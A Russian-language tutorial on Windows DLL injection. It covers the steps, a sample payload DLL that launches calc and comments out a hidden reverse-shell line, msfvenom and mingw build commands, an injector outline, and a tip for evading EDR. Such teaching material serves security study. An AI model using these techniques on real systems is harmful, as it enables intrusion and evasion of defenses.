## DLL Injection (Внедрение DLL)


### Что такое DLL Injection

DLL Injection — это техника, при которой мы загружаем стороннюю DLL (Dynamic-Link Library) в адресное пространство чужого процесса. После загрузки код внутри DLL выполняется в контексте этого процесса, что даёт нам доступ к его памяти, ресурсам и привилегиям.

**Ключевая идея:** Мы заставляем целевой процесс загрузить нашу DLL через вызов `LoadLibraryA`, который уже есть в любом Windows-процессе (через `kernel32.dll`).


### Почему это эффективно

DLL — стандартный механизм Windows для переиспользования кода. Загрузка DLL через `LoadLibrary` — это легитимная операция, которую редко проверяют. Процесс загружает библиотеку, выполняет её `DllMain` (или код в отдельном потоке), а мы получаем контроль.


### Шесть шагов DLL Injection

**Шаг 1** — находим PID целевого процесса. Используем `CreateToolhelp32Snapshot` с флагом `TH32CS_SNAPPROCESS`, затем перебираем процессы через `Process32First` / `Process32Next`, сравнивая имена (`szExeFile`) с искомым процессом.

**Шаг 2** — открываем процесс через `OpenProcess` с правами `PROCESS_ALL_ACCESS`. Это даёт нам доступ к памяти и возможность создавать потоки.

**Шаг 3** — выделяем память в целевом процессе под путь к нашей DLL через `VirtualAllocEx`. Размер — длина строки с путём к DLL. Флаги — `MEM_RESERVE | MEM_COMMIT` и `PAGE_EXECUTE_READWRITE`.

**Шаг 4** — записываем путь к DLL в выделенную память через `WriteProcessMemory`. В памяти процесса теперь хранится полный путь к нашему файлу (например, `C:\malicious.dll`).

**Шаг 5** — получаем адрес функции `LoadLibraryA` через `GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")`. Эта функция умеет загружать DLL по пути. Создаём удалённый поток через `CreateRemoteThread`, передавая в качестве точки входа адрес `LoadLibraryA`, а в качестве аргумента — адрес строки с путём к DLL. Поток запускается и вызывает `LoadLibraryA`, загружая нашу библиотеку.

**Шаг 6** — после создания потока DLL загружается в процесс, выполняется её код (обычно в `DllMain` или в отдельном потоке). Мы получаем контроль над процессом.


### Как создать свою DLL для инжекта

**На Kali (через mingw-w64):**

```bash
# Создаём файл payload.cpp
```

```cpp
#include <windows.h>
#include <stdio.h>

// Точка входа в DLL — вызывается при загрузке
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Код выполняется при загрузке DLL
            MessageBoxA(NULL, "DLL injected successfully!", "Success", MB_OK);
            
            // Запускаем калькулятор
            WinExec("calc.exe", SW_SHOW);
            
            // Или запускаем реверс-шелл
            // WinExec("powershell -e <base64>", SW_HIDE);
            break;
            
        case DLL_PROCESS_DETACH:
            // Код при выгрузке DLL
            break;
    }
    return TRUE;
}
```

**Компиляция:**
```bash
# Для 64-bit
x86_64-w64-mingw32-g++ -shared -o payload.dll payload.cpp -O2 -s

# Для 32-bit
i686-w64-mingw32-g++ -shared -o payload.dll payload.cpp -O2 -s
```

**Важно:** Флаг `-shared` говорит компилятору, что мы создаём DLL, а не EXE.


### Альтернативный способ — сгенерировать DLL через msfvenom

```bash
# 64-bit DLL с калькулятором
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f dll -o payload.dll

# 32-bit DLL
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f dll -o payload.dll
```

**Передаём DLL на целевую машину** (так же, как и EXE: через HTTP, SMB, RDP).


### Отличия от shellcode-инжекта

| | Shellcode-инжект | DLL-инжект |
|---|---|---|
| **Что внедряем** | Машинный код (байты) | Готовый PE-файл (.dll) |
| **Точка входа** | Произвольный адрес | `LoadLibraryA` из kernel32 |
| **Сложность** | Низкая | Средняя |
| **Обнаружение** | Легче детектится (аномальный вызов) | Сложнее (легитимный LoadLibrary) |


### Практический порядок действий

**1. Пишем DLL** на C++ с нужным функционалом (например, калькулятор или реверс-шелл).

**2. Компилируем** в `.dll` через `g++ -shared`.

**3. Пишем инжектор** на C++ (или берём готовый):
```cpp
// 1. Найти PID
// 2. OpenProcess
// 3. VirtualAllocEx под путь к DLL
// 4. WriteProcessMemory (записать путь)
// 5. Получить адрес LoadLibraryA
// 6. CreateRemoteThread(LoadLibraryA, путь)
```

**4. Компилируем инжектор** под целевую архитектуру:
```bash
x86_64-w64-mingw32-g++ injector.cpp -o injector.exe -O2 -s -static
```

**5. Передаём на целевую машину**:
- `injector.exe` — сам инжектор
- `payload.dll` — наша DLL

**6. Запускаем**:
```cmd
injector.exe badr.exe C:\path\to\payload.dll
```

**7. Проверяем результат**:
- Должно открыться окно MessageBox или калькулятор.
- Или сработать реверс-шелл.


### Важные нюансы

**Путь к DLL.** В целевом процессе должен быть доступен полный путь к файлу. Если DLL лежит на сетевом диске или в недоступной папке — загрузка не сработает.

**Разрядность.** 64-битный процесс не может загрузить 32-битную DLL и наоборот. Всегда компилируй DLL под ту же архитектуру, что и целевой процесс.

**DllMain.** Код в `DllMain` должен выполняться быстро (не более 30 секунд), иначе система может зависнуть. Для длительных операций лучше создавать отдельный поток внутри `DllMain`.

**Обход защит.** Многие EDR отслеживают `CreateRemoteThread` с `LoadLibraryA`. Для обхода можно использовать `QueueUserAPC` или `SetWindowsHookEx`.


### Простыми словами

Ты пишешь свою библиотеку (DLL) с нужным функционалом. Затем пишешь программу-инжектор, которая просит целевой процесс загрузить твою библиотеку через штатную функцию Windows `LoadLibraryA`. Процесс загружает её, выполняет код из `DllMain`, и ты получаешь контроль. Это как если бы ты попросил друга прочитать твой документ вместо его собственного, используя его же программу для чтения.
